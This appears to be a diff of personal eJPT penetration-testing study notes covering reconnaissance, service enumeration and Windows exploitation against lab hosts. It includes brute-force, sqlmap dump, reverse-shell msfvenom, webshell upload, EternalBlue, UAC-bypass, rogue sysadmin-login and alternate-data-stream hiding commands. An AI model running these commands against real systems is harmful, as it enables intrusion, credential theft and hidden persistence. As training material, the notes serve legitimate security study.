@@ -45,7 +45,7 @@ iptables ==> https://www.frozentux.net/iptables-tutorial/iptables-tutorial.html
       #Arp: opcode=1 for request and 2 for reply
       #ICMP: type 8 for request and 0 for reply
       Protocol Hierarchy. Navigate to Statistics > Protocol Hierarchy.
-      Export HTTP Object navigate to file > Export Objects > HTTP
+      Export HTTP Object navigate to file > Export Objects > HTTP //To see if anything is different
       To use the Endpoints feature navigate to Statistics > Endpoints
       HTTPS
           Client and server agree on a protocol version
@@ -87,6 +87,8 @@ HTTP
 	If the server does not specify the domain attribute, the browser will automatically set the domain as the server domain and set the cookie host-only flag; this means that the cookie will be sent only to that precise hostname
 openssl s_client -connect hack.me:443 -debug | -state | -quiet and after that OPTIONS HTTP/1.1 Host: hack.me
   -ign_eof
+  ❯ openssl x509 -in twitter.com-cert -noout -text
+
 Websites running PHP install session cookies by using the ==> PHPSESSID, 
 	JSP websites use ==> JSESSIONID
 	#Each development language has its own default session parameter name. Of course, the web developer can also choose to use a custom parameter name
@@ -209,9 +211,13 @@ Web Attacks
     OPTIONS / HTTP/1.1
     Host: www.example.site
 
+    curl -X OPTIONS 192.45.178.3 -v
+
   GET (To request a resource)
     GET /page.php HTTP/1.1 //You can also passa arguments like ==> ... /page.php?course=PTS...
     Host: www.example.site
+
+    curl -X GET 192.45.178.3
 
   POST (To submit HTML form data. POST parameters must be in the message body)
     POST /login.php HTTP/1.1
@@ -219,9 +225,15 @@ Web Attacks
 
     username=john&password=mypass
 
+    curl -X POST 192.45.178.3
+    curl -X POST 192.45.178.3/login.php -d "name=m1l0js&password=m1l0js" -v
+
   HEAD (Very similar to GET, as it asks just headers of the response instead of the response body)
     HEAD / HTTP/1.1
     Host: www.example.site
+
+    curl -I 192.45.178.3
+
 
   PUT (Used to upload a file to the server. It is very dangerous feature if it is allowed and misconfigured)
     PUT /path/to/destination HTTP/1.1
@@ -254,10 +266,15 @@ Web Attacks
       }
 
       [+] In the web browser: victim site/shell.php?cmd=ls
+
+
+    curl -XPUT 192.45.178.3
       
   DELETE (Used to remove a file from the server. If misconfigured leads to denial of service and data loss)
     DELETE /path/to/destination HTTP/1.1
     Host: www.example.site
+
+    curl -XDELETE 192.45.178.3/uploads/hello.txt
 
 
 #REST APIs (Representational State Transfer Application Programming Interface)
@@ -347,7 +364,7 @@ Web Attacks
     xsser (With POST)
       xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' //The -p is from burpsuite
         --auto
-        --Fp: Final payload
+        --Fp: Final payload //<script>alert("XSS")</script>
     xsser (with GET)
       xsser --url ... //Change 'nmap' by XSS ==> poll request //Remember
   //URLs and books
@@ -461,7 +478,26 @@ Web Attacks
         sqlmap -u http://sqlmap.test/login.php --data='user=a&pass=a' -p user --technique=B --banner
       With Burpsuite
         username=a' or 1=1; -- -&pass=a //We could test one field and the other to see which is vulnerable
+
+    Another way
+       sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie
+"PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title --dbs
+      sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie
+"PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title -D bWAPP --tables
+       sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie
+"PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title -D bWAPP -T users
+--columns 
+      sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie
+"PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title -D bWAPP -T users -C
+admin,password,email --dump
       
+
+
+
+
+
+
+
 #Malware
   //NetBus and SubSeven are very famous backdoors
 
@@ -610,7 +646,8 @@ Web Attacks
         \\ComputerName\admin$
           points to the windows installation directory
         \\ComputerName\ipc$ 
-          is used for inter-process communication. You cannot browse it via Windows Explorer
+          is used for inter-process communication. You cannot browse it via Windows Explorer. The IPC$ share is also known as a null session connection. By using this session, Windows
+lets anonymous users perform certain activities, such as enumerating the names of domain accounts and network shares
   
         
   Enumerating Windows Shares
@@ -719,7 +756,7 @@ mb
     Privilege escalation 
       sysinfo
       getuid
-      getsystem
+      getsystem //Try to privesc through several ways.
       background //To 
     Persistence
       exploit/windows/local/persistence
@@ -852,10 +889,9 @@ mb
 -==-=-=-=-=-=-=-=-=-=
 -==-=-=-=-=-=-=-=-=-=
 -==-=-=-=-=-=-=-=-=-=
-eJPTv2
-1. Assessment Methodologies
+eJPTv2 1. Assessment Methodologies
 1.1. Information Gathering
-  - Passive:
+  Passive:
     IP addresses
       host hackersploit.org
       nslookup hackersploit.org
@@ -863,7 +899,9 @@ eJPTv2
       /robots.txt => Contains a list of directories that are not indexed by search engines.
       /sitemap_index.xml => It tells the search engine what content is available and how to reach it.
     Names
-    Email addresses
+    Email Harvesting with theHarvester
+      ❯ theHarvester -d hackersploit.org -b google,linkedin
+      spyse requires a subscription but it seems to be very useful
     Phone numbers
     Physical addresses
     Web technologies being used
@@ -874,14 +912,2105 @@ eJPTv2
     Whois 
     Website Footprinting with Netcraft
     DNS Recon
-      https://digi.ninja/projects/zonetransferme.php
+      dnsrecon: Cloudfare does not hide our proxy mail server addresses really well in MX records 
+      dnsdumpster.com
+    WAF detection with wafw00f
+      wafw00f -l : List all WAFs that WAFW00F is able to detect
+      wafw00f -a : Find all WAFs which match the signatures, do not stop testing on the first one
+    Subdomain enumeration with sublist3r
+    Google Dorks
+      site:ine.com ==> Domain and subdomains
+      inurl:admin
+      intitle:admin
+      site:*.ine.com ==> Subdomains
+      filetype:pdf,xlsx,doc,docx,zip
+      site:ine.com employees
+      intitle:index of 
+      cache:ine.com [https://web.archive.org/]
+      inurl:auth_user_file.txt | passwd.txt
+      **https://www.exploit-db.com/google-hacking-database**
+      intitle:index of credentials
+    Leaked Password Databases
+      Password spraying (same password for different sites)
+      https://haveibeenpwned.com/
+    Useful URLs: https://digi.ninja/projects/zonetransferme.php
+
+  Active information gathering
+    DNS Zone Transfers
+      In certain cases, DNS server admins may want to copy or transfer zone files from one DNS server to another. If misconfigured and left unsecured, this functionality can be abused by attackers to copy the zone file from the primary DNS server to another DNS SERVER
+      DNS records
+        A     - Resolves a hostname or domain to an IPv4 address
+        AAAA  - Resolves a hostname or domain to an IPv6 address
+        NS    - Reference to the domains nameserver
+        MX    - Resolves a domain to a mail server
+        CNAME - Used for domain aliases
+        TXT   - Text record
+        HINFO - Host information
+        SOA   - Domain authority
+        SRV   - Service records
+        PTR   - Resolves an IP address to a hostname
+      ❯ dnsenum zonetransfer.me
+      ❯ fierce --domain zonetransfer.me
+      Examples
+        Purpose 	                Example
+        Lookup WHOIS    record 	  whois tryhackme.com
+        Lookup DNS A    records 	nslookup -type=A tryhackme.com
+        Lookup DNS MX   records  	nslookup -type=MX tryhackme.com 1.1.1.1
+        Lookup DNS TXT  records 	nslookup -type=TXT tryhackme.com
+        Lookup DNS A    records 	dig tryhackme.com A
+        Lookup DNS MX   records 	dig @1.1.1.1 tryhackme.com MX
+        Lookup DNS TXT  records 	dig tryhackme.com TXT
+
+    Host Discovery 
+      sudo nmap -sn 192.168.188.0/24 [No port scan]
+      sudo netdiscover -i ens33 -r 192.168.188.0/24
+    Port scanning 
+      nmap 10.4.19.218 ==> Default nmap scan. Syn scan to the 1000 most frequently used ports.
+      nmap -Pn 10.4.19.218 ==> Windows usually blocks ping probes. So -Pn is necessary. Applicable to Windows targets. Treat all hosts as online - skip host discovery.
+      nmap -Pn -F 10.4.19.218 ==> Fast scan
+      nmap -Pn -sU 10.4.19.218 ==> UDP scan
+        nmap 192.206.172.3 -p 134,177,234 -sUV --script=discovery
+      -sV : Version
+      -O  : Operating system. Not always accurate
+      -sC : List of nmap scripts to enumerate more information
+      -A  : Combine -sV, -O and -sC
+      -oX : xml format. Valid for metasploit
+      --top-port 25
+
+1.2. Footprinting & scanning
+  Mapping a network
+    wireshark
+    arp
+      ❯ sudo arp-scan -I ens33 -g 192.168.188.0/24
+      Open wireshark and see the mac addresses with Statistics => Endpoints 
+    ping : for one host
+    fping : multiple hosts
+      ❯ fping -I ens33 -g 192.168.188.0/24 -a 2>/dev/null
+    nmap
+    zenmap
+  Port scanning
+    Identify operating system
+      Revealed by signatures
+      Revealed by services
+    Identify services
+
+1.3. Enumeration
+  SMB
+    In Windows machine
+      net use z: \\192.168.188.128\c$ /u:admin passloquesea
+      net use * /delete
+      net use z: \\192.168.188.128\c$ /u:admin * [This is for not type the password]
+    Nmap scripts
+      nmap -p445 --script smb-protocols 192.168.188.128
+      --script smb-security-mode
+      nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 192.168.188.138
+      smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 
+      smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 
+      smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 
+      smb-enum-domains --script-args smbusername=administrator,smbpassword=smbserver_771 
+      smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 
+      smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 
+    smbmap
+      smbmap -H 10.129.2.5 -u null
+      smbmap -u guest -p "" -d . -H 192.168.188.128
+      smbmap -u administrator -p smbserver_771 -H 192.168.188.128 -x ipconfig
+      smbmap -u administrator -p smbserver_771 -H 192.168.188.128 -L //List all drives on the specified host
+      smbmap -u administrator -p smbserver_771 -H 192.168.188.128 -r 'C$'
+      smbmap -u administrator -p smbserver_771 -H 192.168.188.128 --upload 'root/backdoortohackyou' 'C$\backdoor'
+      smbmap -u administrator -p smbserver_771 -H 192.168.188.128 --download 'C$\flag.txt'
+      smbmap -H 10.129.117.106 -R --depth 5
+    msfconsole
+      use auxiliary/scanner/smb/smb_version
+      use auxiliary/scanner/smb/smb2
+      use auxiliary/scanner/smb/smb_enumshares
+      use auxiliary/scanner/smb/smb_login ==> Brute force
+        set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
+        set smbuser
+      use auxiliary/scanner/smb/pipe_auditor
+    nbtscan
+      nbtscan -r 192.168.188.0/24
+    nmblookup
+      nmblookup -A 192.168.199.128
+        If <20>, there is a server that we can actually connect to it.
+    smbclient
+      smbclient -L //192.168.188.128 -N
+    rpcclient
+      rpcclient -U "" -N 192.168.188.128 -c "enumdomusers"
+      srvinfo
+      lookupnames admin
+    enum4linux
+      enum4linux -o 192.168.188.128 //Get OS information
+      enum4linux -r -u "admin" -p "password1" 192.168.188.128 //Search for users
+        -U             get userlist
+        -M             get machine list
+        -N             get namelist dump (different from -U and-M)
+        -S             get sharelist
+        -P             get password policy information
+        -G             get group and member list
+        -a             all of the above (full basic enumeration)
+        -I             get about LDAP running on the server
+        -i             printer information
+        -n             nbmlookup
+
+  FTP
+    ftp 192.168.188.128
+    brute force with
+      hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.168.188.128 ftp
+      nmap 192.168.188.128 --script ftp-brute --script-args userdb=/root/users -p 21
+    anonymous login
+     nmap 192.20.26.3 -p21 --script ftp-anon
+
+  SSH
+    ssh 192.168.188.128 22
+    version? 
+      nc 192.168.188.128
+    algorithms that can be used to create the key?
+      nmap 192.168.188.128 -p22 --script ssh-enum-algos
+      ssh -vv 192.168.188.128
+    get ssh server key fingerprint
+      nmap 192.168.188.128 -p22 --script ssh-hostkey --script-args ssh_hostkey=full
+      ssh-keyscan host | ssh-keygen -lf -
+    nmap 192.168.188.128 -p22 --script ssh-auth-methods --script-args "ssh.user=admin"
+    Dictionary attack
+      nmap 192.168.188.128 -p22 --script ssh-brute --scritp-args userdb=/root/user 
+      auxiliary/scanner/ssh/ssh_login
+        set userpass_file /usr/share/wordlist/metasploit/root_userpass.txt
+
+  HTTP
+    IIS
+      whatweb http://192.127.27.3
+        X-XSS-Protection[0] //It has no xss protection
+      http 192.127.27.3
+        files ended in .aspx
+      dirb http://192.127.27.3
+      browsh --startup-url http://192.127.27.3/ //Useful when we don't have a browser to access the target application and we have to use the terminal to access the web application
+      nmap
+        http-enum
+        http-headers
+        nmap 10.2.28.225 -sV -p80 --script http-methods  --script-args http-methods.url-path=/webdav/
+        nmap 10.2.28.225 -sV -p80 --script http-webdav-scan --script-args http-methods.url-path=/webdav/
+
+    Apache
+      nmap 10.2.28.225 -p80 -sV --script banner      
+      msfconsole
+        use auxiliary/scanner/http/http_version
+        use auxiliary/scanner/http/brute_dirs
+        use auxiliary/scanner/http/robots_txt
+      curl 192.168.188.126 | more
+      wget "http://192.168.188.126/index"
+      browsh --startup-url http://192.168.188.126
+      lynx http://192.168.188.126 
+      dirb http://192.168.188.126 /usr/share/metasploit-framework/wordlists/directory.txt
+  MySQL 
+    nmap
+      nmap 192.168.188.126 -sV -p 3306
+      nmap 192.168.188.126 -sV -p 3306 --script=mysql-empty-password
+      nmap 192.168.188.126 -sV -p 3306 --script=mysql-info
+      nmap 192.168.188.126 -sV -p 3306 --script=mysql-users --script-args="mysqluser='root',mysqlpass=''"
+      nmap 192.168.188.126 -sV -p 3306 --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''"
+      nmap 192.168.188.126 -sV -p 3306 --script=mysql-info //List some capabilities
+        InteractiveClient
+      nmap 192.168.188.126 -sV -p 3306 --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''"
+        datadir
+      nmap 192.168.188.126 -sV -p 3306 --script=mysql-audit --script-args="mysql-audit.username='root', mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"
+      nmap 192.168.188.126 -sV -p 3306 --script=mysql-dump-hashes --script-args="username='root',password=''"
+      nmap 192.168.188.126 -sV -p 3306 --script=mysql-query --script-args="query='select count(*) from books.authors;',username=root,password=''"
+
+
+        InteractiveClient ==> Access through mysql
+    mysql -h 192.168.188.126 -u root
+      show databases;
+      use books;
+        select count(*) from authors;
+        select * from authors;
+      select load_file("/etc/shadow");
+      use mysql;
+        select user,password from user;
+      //Get a shell with the mysql client user
+        \! sh
+      mysql -h 192.228.123.3 -u root -e 'show databases';
+
+      
+    msfconsole
+      use auxiliary/scanner/mysql/mysql_schemadump
+        set password ""
+      use auxiliary/scanner/mysql/mysql_file_enum
+        set file_list /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
+      use auxiliary/scanner/mysql/mysql_writable_dirs
+        set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt
+        set password ""
+      use auxiliary/scannner/mysql/mysql_hashdump
+        set username root
+        set password ""
+    dictionary attack
+      msfconsole
+        use auxiliary/scanner/mysql/mysql_login
+          set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+      hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.228.123.3 mysql
+  MS-SQL-S
+    nmap
+      nmap 192.228.123.3 -p 1433 --script ms-sql-info
+      nmap 192.228.123.3 -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433
+      nmap 192.228.123.3 -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt
+      nmap 192.228.123.3 -p 1433 --script ms-sql-empty-password
+      nmap 192.228.123.3 -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" -oN output.txt
+      nmap 192.228.123.3 -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria
+      nmap 192.228.123.3 -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig"
+    msfconsole
+      use auxiliary/scanner/mssql/mssql_login
+        set user_file /root/Desktop/wordlist/common_users.txt
+        set pass_file /root/Desktop/wordlist/100-common-passwords.txt
+      use auxiliary/admin/mssql/mssql_enum
+      use auxiliary/admin/mssql/mssql_enum_sql_logins
+      use auxiliary/admin/mssql/mssql_exec
+        set cmd whoami
+      use auxiliary/admin/mssql/mssql_enum_domains_accounts
+    manual
+      # Using Impacket mssqlclient.py
+      mssqlclient.py [-db volume] <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
+      ## Recommended -windows-auth when you are going to use a domain. Use as domain the netBIOS name of the machine
+      mssqlclient.py [-db volume] -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
+      
+      # Using sqsh
+      sqsh -S <IP> -U <Username> -P <Password> -D <Database>
+      ## In case Windows Auth using "." as domain name for local user
+      sqsh -S <IP> -U .\\<Username> -P <Password> -D <Database> 
+      ## In sqsh you need to use GO after writting the query to send it
+      1> select 1;
+      2> go
+      
+      # Get version
+      select @@version;
+      # Get user
+      select user_name();
+      # Get databases
+      SELECT name FROM master.dbo.sysdatabases;
+      # Use database
+      USE master
+      
+      #Get table names
+      SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
+      #List Linked Servers
+      EXEC sp_linkedservers
+      SELECT * FROM sys.servers;
+      #List users
+      select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
+      #Create user with sysadmin privs
+      CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
+      sp_addsrvrolemember 'hacker', 'sysadmin'
+2.1. Vulnerability assessment
+  Vulnerabilities
+    Heartbleed
+      /usr/share/nmap/scripts/ssl-enum-ciphers.nse
+      /usr/share/nmap/scripts/ssl-heartbleed.nse
+      Change password length and produce a buffer overflow in read.
+    Eternalblue(SMBv1)
+      /usr/share/nmap/scripts/smb-vuln-ms17-010.nse
+    Log4shell
+      https://github.com/giterlizzi/nmap-log4shell
+    Badblue 2.7
+      windows/http/badblue_passthru
+        set payload windows/meterpreter/reverse_tcp
+
+2.2. Auditing fundamentals
+  Compliance
+    PCI DSS (Payment Card Industry Data Security Standard)
+    HIPAA (Health Insurance Portability and Accountability Act of 1996)
+    GDPR (General Data Protection Regulation) //Europe
+    CPPA (California Consumer Privacy Act)
+    SOX (Sarbanes-Oxley Act of 2002)
+  Frameworks
+    ISO/IEC 27000
+    COBIT (Control Objectives for Information and Related IT technologies)
+    NIST Special Publication 800-53
+    CIS Controls and CIS Benchmarks
+    CMMC (Cybersecurity Maturity Model Certification)
+    ASD Essential 8 (Australian Cyber Security Centre Essential 8 Maturity Model)
+  Auditing
+    SCAP & STIGs // Security Content Automation Protocol & Security Technical Implementation Guides
+      SCAP Scan and Stigviewer
+    Nmap
+    Nessus
+
+3.1. Host & network penetration testing: System/Host based attacks
+  3.1.1.Frequently exploited Windows services
+    Microsoft IIS(Internet Information Services)    80/443    Propietary web server software developed by Microsoft that runs on Windows
+    WebDAV(Web Distributed Authoring & Versioning)  80/443    HTTP extension that allows clients to update, delete, move and copy files on a web server. WebDAV is used to enable a web server to act as a file server for colllaborative authoring
+    SMB/CIFS(Server Message Block Protocol)         445       Network file sharing protocol that is used to facilitate the sharing of files and peripherals(printers and serial ports) between computers on LAN
+    RDP(Remote Desktop Protocol)                    3389      Propietary GUI remote access protocol developed by Microsoft and is used to remotely authenticate and interact with a Windows system
+    WinRM(Windows Remote Management Protocol)       5986/443  Windows remote management protocol that can be used to facilitate remote access with Windows systems
+  3.1.2. Exploiting Windows Vulnerabilities 
+    IIS
+      It can be used to host both static and dynamic web pages developed in ASP.NET and PHP
+      Supported executable file extensions
+        .asp
+        .aspx
+        .config
+        .php
+    WebDAV
+      OJO!! The IIS server is not exploitable if the root folder is protected. Also if the root folder is protected, there is no way to determine if WebDAV is even enabled.
+      It is configued to run on the IIS web server
+      In order to connect to a WebDAV server, you will need to provide legitimate credentials. This is because WebDAV implements authentication in the form of a username and password.
+      Tools
+        davtest(Davtest is a WebDAV scanner that sends exploit files to the WebDAV server and automatically creates the directory and uploads different format types of files. The tool also tried to execute uploaded files and gives us an output of successfully executed files)
+        cadaver(Cadaver is a tool for WebDAV clients, which supports a command-line style interface. It supports operations such as uploading files, editing, moving, etc)
+          nmap -sV -p80 --script=http-enum 10.2.17.124
+          hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.2.17.124 http-get /webdav/
+          How to use curl with credentials
+            First method. Read parameters from a file
+              1. Creating a file my_password_file.txt
+              2. machine example.com
+                 login USERNAME
+                 password PASSWORD
+              3. curl --netrc-file my_password_file.txt http://10.2.31.211/webdav/
+            Second method. Read parameters from stdin
+              curl -s -X GET http://10.2.17.24/webdav/ -K- <<<--user bob:password
+          davtest -url http://10.2.17.124/webdav -auth bob:password_123321 
+          cadaver http://10.2.17.124/webdav 
+            put /usr/share/webshells/asp/webshell.asp
+          Or we could use curl to upload a file
+            curl -T 'shell.txt' 'http://$ip'
+          After that delete webshell.asp
+        metasploit
+          Listen manually
+            nmap -sV -p80 --script=http-enum 10.2.30.233
+            msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=4126 -f asp > shell.asp //It is recommended to use 32 architecture because it will works on both
+            service postgreSQL start 
+            msfconsole -q
+            use multi/handler
+              set payload windows/meterpreter/reverse_tcp
+              set lhost 10.10.5.2
+              set lport 4126
+
+          search  iis upload
+            exploit/windows/iis/iis_webdav_upload_asp
+            set HttpPassword 
+            set HttpUsername
+            set PATH /webdav/metasploit.asp
+    SMB
+      Originally, SMB ran on top of NetBIOS using port 139
+      The SMB protocol utilizes two levels of authentication(Both of these authentication levels utilize a challenge response authentication system), namely:
+        + User authentication: Users must provide a username and password in order to authenticate with the SMB server in order to access a share
+        + Share authentication: Users must provide a password in order to access restricted share
+
+      PsExec
+        It is a lightweight telnet-replacement developed by Microsoft that allows you execute processes on remote windows systems using any user's credentials.
+        PsExec authentication is performed via SMB
+        We can use the PsExec utility to authenticate with the target system legitimately and run arbitrary commands or launch a remote command prompt.
+        Similar to RDP, however, instead of controlling the remote system via GUI, commands are sent via CMD.
+          nmap -sCV 192.168.188.126
+          msfconsole
+            use scanner/smb/smb_login
+              set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
+              set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+          Once we have gained credentials
+            psexec.py administrator@192.168.188.126 cmd.exe
+            msfconsole 
+              use exploit/windows/smb/psexec
+                set smbuser administrator
+                set smbpass qweryuiop
+      Eternalblue
+        sudo nmap -sV -p445 -O 10.2.25.40
+        nmap -sV -p445 10.2.25.40 smb-vuln-ms17-010
+        Manually
+          git clone https://github.com/3ndG4me/AutoBlue-MS17-010
+          pip install -r requirements.txt
+          cd shellcode
+          shell_prep.sh
+          msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=192.168.188.128 LPORT=4126
+          sc_x64.bin or sc_x86.bin
+          nc -lvnp 4126
+          python3 eternalblue_exploit7.py 192.168.188.126 /shellcode/sc_x64.bin
+        msfconsole
+          use windows/smb/ms17_010_eternalblue
+    RDP 
+      Maybe it is on another port than 3389
+        msfconsole
+          use auxiliary/scanner/rdp/rdp_scanner
+        hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://192.168.188.126 -s 3333
+        xfreerdp /u:administrator /p:qwertyuiop /v:192.168.188.126:3333
+
+      BlueKeep Vulnerability  
+        This vulnerability has various illegitimate PoC's and exploit code that could be malicious in nature.
+        nmap -p 3389 192.168.188.126 
+        search BlueeKeep
+          First check
+            auxiliary/scanner/rdp/cve_2019_0708_bluekeep 
+          Exploit it
+            exploit/windows/rdp/cve_2019_0708_bluekeep_rce 
+              show targets
+    WinRM
+      We can utilize crackmapexec to perform a brute-force on WinRM and we can also utilize a ruby script called evil-winrm to obtain a command shell session on the target system
+      WinRM is tipically used in the following ways:
+        > Remotely access and interact with Windows hosts on a local network
+        > Remotely access and  execute commands on Windows systems on the internet
+        > Manage and configure Windows systems remotely
+      WinRM typically uses TCP port 5985 and 5986(HTTPS)
+        crackmapexec winrm 192.168.188.126 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
+        crackmapexec winrm 192.168.188.126 -u administrator -p tinkerbell -x "whoami"
+      Obtain a command shell
+        evil-winrm -i 10.129.69.58 -u 'administrator' -p 'tinkerbell' ==> 
+        msfconsole
+          //First of all, we need to know the auth methods allowed.
+            auxiliary/scanner/winrm/winrm_auth_methods
+            //Check the URI. Maybe /wmsan works
+          //Valid credentials
+            auxiliary/scanner/winrm/winrm_login 
+              set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
+              set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+          //Can we execute commands?
+          auxiliary/scanner/winrm/winrm_cmd
+            //Set username, password and cmd = whoami
+          //Let's gain a shell
+            search winrm_script_exec
+            set force_vbs true
+3.1.3.Windows Privilege Escalation
+  Windows kernel
+    A kernel is a computer program that is the core of an operating system and has complete control over every resource and hardware on a system. It acts as a translation layer between hardware and software and facilitates the communication between these two layers
+    Windows NT is the kernel that comes pre-packaged with all versions of Microsoft Windows and operates as a traditional kernel with a few exceptions based on user design philosophy. It consists of two main modes of operation that determine access to system resources and hardware:
+      + User mode: Programs and services running un user mode have limited access to system resources and functionality
+      + Kernel mode: Kernel mode has unrestricted access to system resources and functionality with the added functionality of managing devices and system memory.
     
+    Tools
+      https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+        systeminfo in the target machine and copy it to a .txt
+        ./windows-exploit-suggester.py --update
+        ./windows-exploit-suggester.py --database *.mssb.xls --systeminfo win7.txt
+      https://github.com/SecWiki/windows-kernel-exploits
+      
+      msfconsole -q
+        search suggester
+          use post/multi/recon/local_exploit_suggester
+  Saved windows credentials
+    cmdkey /list
+    runas /savecred /user:username cmd.exe
+  Bypassing UAC with UACMe 
+    In order to successfully bypass UAC, we will need to have access to a user account that is a part of the local administrators group on the Windows target system.
+    UAC has various integrity levels ranging from low to high, if the UAC protection level is set below high, Windows programs can be executed with elevated privileges without prompting the user for confirmation.
+    msfconsole
+      setg rhosts 10.2.22.220
+      use exploit/windows/http/rejetto_hfs_exec
+        sysinfo
+        pgrep explorer
+        migrate 2448
+        sysinfo
+        getuid
+        getprivs
+        shell
+          net user m1l0js
+          net localgroup administrators
+          net user admin password123
+          (Not allowed)
+        https://github.com/hfiref0x/UACME
+        msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.188.133 LPORT=1234 -f exe > backdoor.exe
+        msfconsole
+          use multi/handler //Listening for new connections
+          set payload windows/meterpreter/reverse_tcp
+        msfconsole 
+          cd C:\\ 
+          mkdir Temp
+          upload backdoor.exe
+          upload /root/Desktop/tools/UACME/Akagi64.exe
+          .\Akagi64.exe 23 C:\Temp\backdoor.exe
+
+  Access Token Impersonation
+    + Windows access tokens are created and managed by the Local Security Authority Subsystem Service (LSASS)
+    + Access tokens are generated by the winlogon.exe process every time a user authenticates successfully and includes the identity and privileges of the user account associated with the thread or process. This token is then attached to the userinit.exe process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.
+    + An access token will typically be assigned one of the following security levels:
+      > Impersonate-level tokens are created as a direct result of a non-interactive login on Windows, typically through specific system services or domain logons.
+        Impersonate-level tokens can be used to impersonate a token on the local system and not on any external systems that utilize the token.
+        We can use the incognito module to display a list of available tokens that we can impersonate.
+        The following are the privileges that are required for a successful impersonation attack:
+          - SeAssignPrimaryToken: This allows a user to impersonate tokens
+          - SeCreateToken: This allows a user to create an arbitrary token with administrative privileges
+          - SeImpersonatePrivilege: This allows a user to create a process under the security context of another user typically with administrative privileges.
+      > Delegate-level tokens are typically created through an interactive login on Windows, primarily through a traditional login or through remote access protocols such as RDP
+        Delegate-level tokens pose the largest threat as they can be used to impersonate tokens on any system.
+    +load incognito
+      //Incognito is a built-in meterpreter module that was originally a standalone application that allows you to impersonate user tokens after successful exploitation
+      list_tokens -u 
+      impersonate_token "ATTACKDEFENSE\Administrator"
+      getuid
+      getprivs
+      pgrep explorer
+      (finish it)
+3.1.4. Windows File system vulnerabilities
+  Alternate Data Streams
+    [+] ADS is an NTFS(New Technology File System) file attribute and was designed to provide compatibility with the MacOS HFS(Hierarchical File System).
+    [+] Any file created on an NTFS formatted drive will have two different forks/streams:
+        > Data stream: Default stream that contains the data of the file
+        > Resource stream: Typically contains the metadata of the file
+    [+] Attackers can use ADS to hide malicious code or executables in legitimate files in order to evade basic signature based AVs and static scanning tools. This can be done by storing the malicious code or executables in the file attribute resource stream (metadata) of a legitimate file. 
+    [+] notepad test.txt:secret.txt 
+    [+] change name winpeas.exe to payload.exe
+    [+] type payload.exe > windowslog.txt:winpeas.exe
+    [+] start windowslog.txt:winpeas.exe
+    [+] cd Windows\System32
+    [+] mklink wupdate.exe C:\Temp\windowslog.txt:winpeas.exe
+    [+] wupdate
+3.1.5. Windows Credential Dumping
+  Windows Password Hashes
+    > Windows OS stores hashed user accounts and passwords locally in the SAM(Security Accounts Manager) database
+        The SAM database file cannot be copied while the operating system is running
+        The Windows NT kernel keeps the SAM database file locked and as a result, attackers typically utilize in-memory techniques and tools to dump SAM hashes from the LSASS process.
+        In modern versions of Windows, the SAM database is encrypted with a syskey.
+    > Authentication and verification of user credentials is facilitated by the LSA (Local Security Authority)
+        Elevated/Administrative privileges are required in order to access and interact with the LSASS process 
+        This service has a cache of memory with the hashes as it interacts with the SAM database
+    > Windows disables LM hashing and utilizes NTLM hashing from Windows Vista onwards
+    
+    LM(LanMan)
